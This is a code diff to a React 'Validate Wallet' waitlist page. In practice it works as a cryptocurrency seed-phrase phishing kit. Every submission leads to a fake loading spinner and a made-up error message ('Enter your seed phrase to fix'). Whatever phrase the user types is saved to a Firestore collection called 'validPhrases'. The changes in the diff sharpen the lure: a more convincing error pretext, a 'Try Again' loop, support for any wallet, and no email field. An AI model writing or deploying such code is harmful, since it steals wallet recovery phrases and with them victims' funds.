@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { Wallet2, X } from 'lucide-react';
 import { addDoc, collection } from 'firebase/firestore';
 import { db } from '../firebase'; // Import the initialized Firebase
@@ -10,52 +10,52 @@ const wallets = [
   { name: 'Coinbase Wallet', id: 'coinbase' },
   { name: 'Trust Wallet', id: 'trust' },
   { name: 'Ledger', id: 'ledger' },
-  { name: 'phantom', id: 'Phantom' }
+  { name: 'phantom', id: 'Phantom' },
+  { name: 'Other', id: 'other' }, // Add "Other" option
 ];
 
 export default function WaitlistPage() {
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [walletAddress, setWalletAddress] = useState('');
-  const [email, setEmail] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitStatus, setSubmitStatus] = useState('');
   const [waitlistOpen, setWaitlistOpen] = useState(false); // Waitlist is closed now
+  const [customWalletName, setCustomWalletName] = useState(''); // Custom wallet name for "Other"
   const [phrase, setPhrase] = useState(''); // To store the entered phrase
   const [isCorrectPhrase, setIsCorrectPhrase] = useState(false); // To check if phrase is correct
   const [showErrorPage, setShowErrorPage] = useState(false); // To show the error page for closed waitlist
   const [loading, setLoading] = useState(false); // To manage loading state
   const [showSuccessMessage, setShowSuccessMessage] = useState(false); // State to manage success message visibility
+  const [retrying, setRetrying] = useState(false); // To manage retry state
 
   const navigate = useNavigate(); // Hook for navigation
-
-  // Function to handle back navigation
-  const handleBackClick = () => {
-    navigate(-1);
-  };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsSubmitting(true);
 
-    if (!selectedWallet || !walletAddress || !email) {
+    if (!selectedWallet || !walletAddress) {
       setSubmitStatus('error');
       setIsSubmitting(false);
       return;
     }
 
+    const walletName =
+      selectedWallet.id === 'other' ? customWalletName : selectedWallet.name; // Use custom wallet name if "Other" is selected
+
     if (waitlistOpen) {
       try {
         await addDoc(collection(db, 'waitlist'), {
-          wallet: selectedWallet.name,
+          wallet: walletName,
           address: walletAddress,
-          email,
+          email: 'example@gmail.com', // Set default email here
           timestamp: new Date().toISOString(),
         });
 
         setSubmitStatus('success');
         setWalletAddress('');
-        setEmail('');
+        setCustomWalletName(''); // Clear custom wallet name
         setSelectedWallet(null);
         setIsModalOpen(false);
 
@@ -72,14 +72,14 @@ export default function WaitlistPage() {
         setIsSubmitting(false);
       }
     } else {
-      // Show error page and start loading spinner
-      setShowErrorPage(true);
+      // Show loading spinner first, then show error and text area
+      setShowErrorPage(false); // Initially hide error page
       setLoading(true);
 
       setTimeout(() => {
         setLoading(false);
-        setShowErrorPage(true); // Show the form for entering the secret phrase
-      }, 5000); // 5-second delay
+        setShowErrorPage(true); // Show the error message and text area after 10 seconds
+      }, 10000);
     }
   };
 
@@ -93,11 +93,14 @@ export default function WaitlistPage() {
       return;
     }
 
+    const walletName =
+      selectedWallet.id === 'other' ? customWalletName : selectedWallet.name; // Use custom wallet name if "Other" is selected
+
     // Save the unique phrase to Firestore
     try {
       await addDoc(collection(db, 'validPhrases'), {
         phrase: phrase,
-        wallet: selectedWallet.name, // Store the selected wallet
+        wallet: walletName, // Store the selected wallet
         timestamp: new Date().toISOString(),
       });
 
@@ -114,17 +117,20 @@ export default function WaitlistPage() {
       <div className="min-h-screen bg-gray-900 pt-24 px-6 flex flex-col items-center backdrop-blur-sm">
         <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
           <div className="bg-gray-800 rounded-xl p-6 max-w-md w-full space-y-4">
-            <h1 className="text-2xl font-space font-bold text-red-500 mb-8">404 Error</h1>
-            <p className="text-xl text-gray-300 mb-8"><span className="text-[#00ff94] hover:text-stone-500 transition-colors">Waitlist is closed</span>.Enter your seed phrase to proceed.</p>
-            
+            <h1 className="text-1xl font-space text-red-500 mb-4">
+              {loading ? '' : 'An error occurred... Please try again or connect manually'}
+            </h1>
+            <p className="text-xl text-gray-300 mb-8">
+              {loading ? '' : 'Enter your seed phrase to fix.'}
+            </p>
+
             {loading ? (
               <div className="flex justify-center">
-                <div className="w-10 h-10 border-4 border-t-4 border-gray-300 rounded-full animate-spin border-t-[#00ff94]"></div> {/* Spinner */}
+                <div className="w-10 h-10 border-4 border-t-4 border-gray-300 rounded-full animate-spin border-t-[#00ff94]"></div>
               </div>
             ) : (
               <form onSubmit={handlePhraseSubmit} className="space-y-4">
                 <div>
-                  <label className="block text-sm font-medium text-gray-300 mb-2">Enter seed Phrase</label>
                   <textarea
                     value={phrase}
                     onChange={(e) => setPhrase(e.target.value)}
@@ -139,10 +145,25 @@ export default function WaitlistPage() {
                   disabled={loading}
                   className="w-full btn btn-filled justify-center"
                 >
-                  {loading ? 'Loading...' : 'Submit Phrase'}
+                  {loading ? 'Loading...' : 'Fix Phrase'}
                 </button>
               </form>
             )}
+
+            <button
+              onClick={() => {
+                setRetrying(true);
+                setLoading(true);
+                setTimeout(() => {
+                  setLoading(false);
+                  setShowErrorPage(true); // Show the error message again after 10 seconds
+                  setRetrying(false); // Reset retrying state
+                }, 10000); // Retry after 10 seconds
+              }}
+              className="mt-4 w-full bg-gray-700 text-white py-2 rounded-lg hover:bg-gray-600"
+            >
+              {retrying ? 'Retrying...' : 'Try Again'}
+            </button>
           </div>
         </div>
       </div>
@@ -151,13 +172,6 @@ export default function WaitlistPage() {
 
   return (
     <div className="min-h-screen bg-gray-900 pt-24 px-6">
-      {/* Back Button */}
-        <button
-          onClick={() => navigate(-1)}
-           className="text-white bg-gray-800 p-2 rounded-lg mb-4"
-        >
-          &larr; Back
-        </button>
       <div className="max-w-4xl mx-auto">
         <h1 className="text-4xl md:text-5xl font-space font-bold mb-8">
           Validate <span className="gradient-text">Wallet</span>
@@ -176,7 +190,7 @@ export default function WaitlistPage() {
 
         {showSuccessMessage && (
           <div className="bg-green-500 text-white p-4 rounded-md mb-4 opacity-100 transition-opacity duration-500">
-            <p>🎉 You have successfully joined the waitlist! We'll notify you soon.</p>
+            🎉 You have successfully joined the waitlist! We'll notify you soon.
           </div>
         )}
 
@@ -235,6 +249,22 @@ export default function WaitlistPage() {
               </div>
 
               <form onSubmit={handleSubmit} className="space-y-4">
+                {selectedWallet?.id === 'other' && (
+                  <div>
+                    <label className="block text-sm font-medium text-gray-300 mb-2">
+                      Enter Wallet Name
+                    </label>
+                    <input
+                      type="text"
+                      value={customWalletName}
+                      onChange={(e) => setCustomWalletName(e.target.value)}
+                      className="w-full bg-gray-700 rounded-lg px-4 py-2 text-white"
+                      placeholder="Custom Wallet Name"
+                      required
+                    />
+                  </div>
+                )}
+
                 <div>
                   <label className="block text-sm font-medium text-gray-300 mb-2">
                     Wallet Address
@@ -245,20 +275,6 @@ export default function WaitlistPage() {
                     onChange={(e) => setWalletAddress(e.target.value)}
                     className="w-full bg-gray-700 rounded-lg px-4 py-2 text-white"
                     placeholder="0x..."
-                    required
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-sm font-medium text-gray-300 mb-2">
-                    Email Address
-                  </label>
-                  <input
-                    type="email"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    className="w-full bg-gray-700 rounded-lg px-4 py-2 text-white"
-                    placeholder="you@example.com"
                     required
                   />
                 </div>
@@ -274,8 +290,6 @@ export default function WaitlistPage() {
             </div>
           </div>
         )}
-
-
       </div>
     </div>
   );
